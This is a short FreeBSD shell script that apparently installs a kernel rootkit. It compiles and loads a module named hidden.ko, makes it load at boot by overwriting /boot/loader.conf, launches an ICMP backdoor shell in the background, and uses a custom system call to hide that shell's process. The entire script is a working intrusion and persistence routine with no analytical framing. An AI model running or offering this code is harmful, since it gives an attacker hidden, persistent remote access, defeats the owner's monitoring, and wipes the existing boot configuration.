#! /bin/sh

make
gcc mvko.c -o mvko
gcc __icmpshell.c -o __icmpshell
./mvko
echo 'hidden_load="YES"' > /boot/loader.conf
kldload ./hidden.ko
./__icmpshell &
perl -e '$str = "on";' -e 'syscall(210, $str);'
perl -e '$str = "__icmpshell";' -e 'syscall(210, $str);'
